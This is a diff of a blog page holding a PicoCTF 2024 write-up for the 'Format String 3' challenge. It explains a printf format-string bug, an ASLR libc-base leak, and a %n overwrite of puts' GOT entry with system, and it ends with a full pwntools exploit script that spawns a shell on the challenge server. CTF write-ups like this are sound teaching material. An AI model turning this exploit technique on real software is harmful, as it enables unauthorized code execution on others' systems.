@@ -5,23 +5,113 @@
         <title>mackan.dev - Format String 3</title>
         <link rel="stylesheet" href="/assets/css/tw-compiled.css" type="text/css" media="all" />
         <link rel="stylesheet" href="/assets/fonts/IBMPlex.css" type="text/css" media="all" />
+        <meta property="og:type" content="website" />
+        <meta property="og:url" content="https://www.mackan.dev/format-string-3" />
+        <meta property="og:title" content="Format String 3 - PicoCTF 2024 Writeup" />
+        <meta property="og:description" content="Exploiting a format string vulnerability in a given binary, by analyzing stack layout and gaining arbitrary code execution, by careful leveraging of %n formats." />
     </head>
-    <body class="bg-gray-900">
+    <body class="bg-gray-900 text-gray-50">
         <a class="flex justify-center items-center font-mono font-semibold text-yellow-500 text-xl h-14 w-40" href="/">
             MACKAN.DEV
         </a>
         <div class="mt-8">
             <div class="max-w-2xl m-auto my-8">
-                <h1 class="font-mono text-gray-50 text-3xl mb-4 font-semibold"><a href="/articles/format-string-3">PicoCTF 2024 - Format String 3</a></h1>
+                <h1 class="font-mono font-semibold text-3xl mb-4"><a href="/articles/format-string-3">PicoCTF 2024 - Format String 3</a></h1>
                 <span class="text-sm text-gray-400">Jul 4, 2024</span>
-                <p class="text-gray-50">I want to preface this writeup by saying that I did this before I did format-string 1 and 2. This is because I, arrogantly, assumed that I already knew all about format string vulnerabilities and how they worked. Luckily I was wrong and learned a whole lot.</p>
-
-                <p>TODO: Finish article, and create md->article script</p>
-                <div class="font-mono text-sm my-2">
+                <div class="font-mono text-black text-sm my-2">
                     <span class="bg-yellow-500 px-2 py-0.5 rounded-sm">Writeup</span>
                     <span class="bg-yellow-500 px-2 py-0.5 rounded-sm">Binary Exploitation</span>
                 </div>
+                <p>I want to preface this writeup by saying that I did this before I did format-string 1 and 2. This is because I, arrogantly, assumed that I already knew all about format string vulnerabilities and how they worked. Luckily I was wrong and learned a whole lot.</p>
+                <h3 class="font-mono font-semibold text-xl mt-2">Description</h3>
+                <p>This program doesn&#39;t contain a win function. How can you win? Download the binary <a href="https://artifacts.picoctf.net/c_rhea/3/format-string-3">here</a>. Download the source <a href="https://artifacts.picoctf.net/c_rhea/3/format-string-3.c">here</a>. Download libc <a href="https://artifacts.picoctf.net/c_rhea/3/libc.so.6">here</a>, download the interpreter <a href="https://artifacts.picoctf.net/c_rhea/3/ld-linux-x86-64.so.2">here</a>. Run the binary with these two files present in the same directory.</p>
+                <h3 class="font-mono font-semibold text-xl mt-2">Behavior</h3>
+                <pre class="text-sm bg-gray-800 overflow-auto rounded-sm p-2 my-2"><code>Howdy gamers!
+Okay I&#39;ll be nice. Here&#39;s the address of setvbuf in libc: 0x70a3c9d2f3f0
+%x%x%x Hello!
+c9e8d963fbad208bbe4d5600 Hello!
+/bin/sh
+</code></pre>
+                <p>The program outputs the hex location of setvbuf in libc, then it takes in user input and reflects it with raw printf, without string format protection.</p>
+                <h3 class="font-mono font-semibold text-xl mt-2">Vulnerable Code</h3>
+                <pre class="text-sm bg-gray-800 overflow-auto rounded-sm p-2 my-2"><code>fgets(buf, 1024, stdin);	
+printf(buf);
+
+puts(normal_string); // normal_string is /bin/sh
+</code></pre>
+On this code I am supposed to use printf %n vulnerability to somehow execute system() instead of puts.
+                <pre class="text-sm bg-gray-800 overflow-auto rounded-sm p-2 my-2"><code>  4012db:       48 89 c7                mov    %rax,%rdi
+  4012de:       b8 00 00 00 00          mov    $0x0,%eax
+  4012e3:       e8 b8 fd ff ff          call   4010a0 <printf@plt>
+  4012e8:       48 8b 05 59 2d 00 00    mov    0x2d59(%rip),%rax
+  4012ef:       48 89 c7                mov    %rax,%rdi
+  4012f2:       e8 89 fd ff ff          call   401080 <puts@plt>
+  4012f7:       b8 00 00 00 00          mov    $0x0,%eax
+  4012fc:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
+  401300:       64 48 2b 14 25 28 00    sub    %fs:0x28,%rdx
+</code></pre>
+                <h3 class="font-mono font-semibold text-xl mt-2">Arbitrary Writes through %n</h3>
+                <p class="mb-2">%n works by writing amount of written charachters to the pointer that is in that memory address. This is unlike all other format specifiers, since they can only read data.</p>
+                <p class="mb-2">When you write to an argument with printf, you actually just write to stack. And you can write to previous arguments that are in stack, if you get the correct offset.</p>
+                <p class="mb-2">Let's start by reading the stack with a regular %x format string exploit.</p>
+                <pre class="text-sm bg-gray-800 overflow-auto rounded-sm p-2 my-2"><code>Howdy gamers!
+Okay I'll be nice. Here's the address of setvbuf in libc: 0x7af355ecb3f0
+%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
+56029963 fbad208b f0afd300 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 25207825 20782520 78252078 25207825 20782520 78252078 25207825
+20782520
+/bin/sh
+</code></pre>
+                <p class="mb-2">The repeating 20782520 seems to be the %x strings, which means that we can find the offset, put a pointer into the first argument, and overwrite it by %n.</p>
+                <p class="mb-2">We are unable to directly execute shellcode using this arbitrary write, due to NX protections. In modern systems it is impossible to have a data segment be both writable and executable, this is to prevent this type of attack. What is done instead to elevate from arbitrary write is called ret2libc, where you can overwrite the (writable) global offset table, and make other functions run different libc functions than intended.</p>
+                <p class="mb-2">In this instance, we need to overwrite the GOT entry of puts, into system, since at the end of the script it runs puts("/bin/sh")</p>
+                <h3 class="font-mono font-semibold text-xl mt-2">Finding the address of system()</h3>
+                <p class="mb-2">ASLR protections will complicate this a bit, since we can't simply find the static adress of system() in lib.so.6 and place it into the GOT. Luckily there is no PIC on the binary itself, which will make it easier to find a pointer to the offset table.</p>
+                <p class="mb-2">Luckily we can easily find the ASLR offset through the second line that gives us the address to setvbuf. Then from that we just calculate the ASLR offset to libc, and add the system() offset to that. This could be manually done, but pwntools gives us a really nice interface to do this.</p>
+                <pre class="text-sm bg-gray-800 overflow-auto rounded-sm p-2 my-2"><code>static_setvbuf = libc.sym.setvbuf # Get setvbuf from lib.so.6 ELF
+aslred_setvbuf = r.recv(12) # Get aslred setvbuf from ELF output
+aslred_setvbuf = int(aslred_setvbuf, 16) # Convert it to integer
+libc.address = aslred_setvbuf - static_setvbuf # Set libc offset
+</code></pre>
+                <h3 class="font-mono font-semibold text-xl mt-2">Overwriting got.plt</h3>
+                <p class="mb-2">First let's try making an arbitrary write to an unavailable address, and see if we can sigsegv.</p>
+                <pre class="text-sm bg-gray-800 overflow-auto rounded-sm p-2 my-2"><code>r.sendline(bytes.fromhex("12345678") + b"aaaaaaaaaa %38$n")
+</code></pre>
+                <p class="mb-2">Here I get sigsegv -11, which means I'm trying to access an invalid memory adress. This is as expected and means I am on the correct track.</p>
+                <p class="mb-2">A big problem with writing with %n like this is that I would need to write 2^48 charachters to the buffer, to overwrite a single 6-byte address. This is unfeasible, and would mean I would have to send 281 terabytes losslessly over network.</p>
+                <p class="mb-2">Instead I could send it over sequentially overwrite byte by byte. First overwrite pointer to 0x404018 then 0x404019 until 0x40401f. This is very fiddly, and instead of doing it manually you can use pwntools built in function to generate these payloads fmtstr_payload()</p>
+                <pre class="text-sm bg-gray-800 overflow-auto rounded-sm p-2 my-2"><code>r.sendline(fmtstr_payload(38, {elf.got['puts']: libc.sym['system']}))
+</code></pre>
+                <p class="mb-2">38 is the offset that we calculated earlier to reach the first argument, elf.got['puts'] is the pointer that we want to overwrite, and libc.sym['system'] is what we overwrite it with. Note that the libc object is the one that we set the offset on earlier.</p>
+                <h3 class="font-mono font-semibold text-xl mt-2">Final Script</h3>
+                <p class="mb-2">I added some comments to the script so that it's easier to understand.</p>
+                <pre class="text-sm bg-gray-800 overflow-auto rounded-sm p-2 my-2"><code>from pwn import *
+
+context(arch="amd64", os="linux")
+elf = ELF("format-string-3") # Context from local binary, so pwntools knows all offsets
+libc = elf.libc
+
+
+# r = gdb.debug("./format-string-3", gdbscript='continue')
+# r = process("./format-string-3")
+r = remote("pico instance here")
+
+r.recvline() # Skip howdy gamers
+r.recvuntil("x") # Skip output until pointer after 0x
+
+static_setvbuf = libc.sym.setvbuf # Get setvbuf from lib.so.6 ELF
+aslred_setvbuf = r.recv(12) # Get aslred setvbuf from ELF output
+aslred_setvbuf = int(aslred_setvbuf, 16) # Convert it to integer
+libc.address = aslred_setvbuf - static_setvbuf # Set libc offset
+
+r.sendline(fmtstr_payload(38, {elf.got['puts']: libc.sym['system']})) # Send the payload
+r.interactive()
+</code></pre>
             </div>
+            <footer class="flex justify-center text-gray-400 pb-4">
+                <span>
+                    Maxim Pavlenko &copy; 2024
+                </span>
+            </footer>
         </div>
     </body>
 </html>
